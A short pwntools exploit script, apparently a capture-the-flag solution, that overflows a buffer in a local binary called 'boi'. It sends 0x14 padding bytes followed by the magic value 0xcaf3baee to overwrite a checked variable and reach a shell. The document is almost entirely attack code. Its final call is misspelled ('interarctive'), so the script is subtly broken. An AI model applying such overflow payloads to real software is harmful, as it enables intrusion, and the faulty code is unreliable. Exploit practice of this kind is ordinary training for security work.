from pwn import *


target = process('./boi')

# Add padding to the overflow
payload = b"\x00"*0x14 + p32(0xcaf3baee)

# sending payload

target.sendline(payload)

target.interarctive()

